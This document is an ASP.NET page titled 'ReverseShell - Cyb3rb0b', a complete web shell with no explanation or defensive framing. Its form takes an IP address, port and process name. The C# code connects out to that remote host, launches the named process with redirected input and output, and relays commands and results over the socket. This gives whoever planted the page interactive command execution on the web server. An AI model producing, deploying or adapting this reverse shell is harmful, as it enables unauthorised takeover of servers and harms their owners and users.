<%@ Page Language="C#" Debug="true" Trace="false" %>

<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.ComponentModel" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Threading" %>


<html>
<head>
    <title>ReverseShell - Cyb3rb0b</title>
</head>
<script language="c#" runat="server">
    private StreamWriter streamWriter;

    void Page_Load(object sender, EventArgs e)
    {
        if (!this.IsPostBack)
        {
            // Start();
        }

    }

    private void Start()
    {
        try
        {
            int port = int.Parse(this.txtPort.Text);
            string address = this.txtIp.Text;
            using (TcpClient client = new TcpClient(address.Trim(), port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = this.txtProcess.Text.Trim();
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }
    }

    private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();

        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception err) {
                Response.Write(err.ToString());
            }
        }
    }


    protected void Button1_Click(object sender, EventArgs e)
    {
        try
        {
            Start();
        }
        catch (Exception err) {
            Response.Write(err.ToString());
        }

    }
</script>
<body>
    <form id="form" runat="server">
        <table>
            <tr>
                <td>IP
                </td>
                <td>
                    <asp:TextBox ID="txtIp" runat="server"></asp:TextBox>
                </td>
            </tr>
            <tr>
                <td>Port
                </td>
                <td>
                    <asp:TextBox ID="txtPort" runat="server"></asp:TextBox>
                </td>
            </tr>
            <tr>
                <td>Port
                </td>
                <td>
                    <asp:TextBox ID="txtProcess" runat="server"></asp:TextBox>
                </td>
            </tr>
            <tr>
                <td colspan="2">
                    <asp:Button ID="Button1" runat="server" Text="Connect" OnClick="Button1_Click" />
                </td>
            </tr>
        </table>

    </form>

</body>
</html>
